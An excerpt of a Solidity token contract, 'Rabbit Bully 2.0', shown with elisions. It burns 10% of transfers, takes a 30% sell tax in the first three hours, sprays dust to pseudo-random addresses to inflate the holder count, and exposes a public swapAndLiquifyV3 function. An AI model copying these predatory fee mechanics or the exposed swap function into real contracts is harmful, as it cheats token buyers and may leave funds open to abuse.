...
contract token is ERC20 {
    ...
    //name,symbol
    string internal tokenName = "Rabbit Bully 2.0";
    string internal tokenSymbol = "Rabbit Bully 2.0";
    ...
    function setOpen(bool _enable) public {
        require(
    ...
    function _transfer(
        ...
        if (takeFee) {
            ...
            if(to != uniswapV2Pair && from != uniswapV2Pair){
                super._transfer(from, _destroyAddress, amount.div(100).mul(10));
                super._transfer(from, to, amount.div(100).mul(90));
                return;
            }
           
            if(startTime.add(10800) > block.timestamp && to == uniswapV2Pair){
                super._transfer(from, address(this), amount.div(100).mul(30));  
                amount = amount.div(100).mul(70);//70%
            }else{
                address ad; //0.3%
                for(int i=0;i<=2;i++){
                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _basicTransfer(from,ad,amount.div(1000).mul(1)); 
                }
                super._transfer(from, address(this), amount.div(1000).mul(47));  //1.7market+3reward
    ...
    function swapAndLiquifyV3(uint256 contractTokenBalance) public {
        ...
        _splitOtherTokenSecond(newBalance.div(100).mul(50));  //分LP的U
        RewardToken.transfer(_marketingWalletAddress, newBalance.div(100).mul(30));
        ...
        if(buySize>0){
            ...
            if(buySize >20){
                for(uint256 i=0;i<20;i++){
                    ...
                    if(balanceOf(user) > 50000000*10**18){
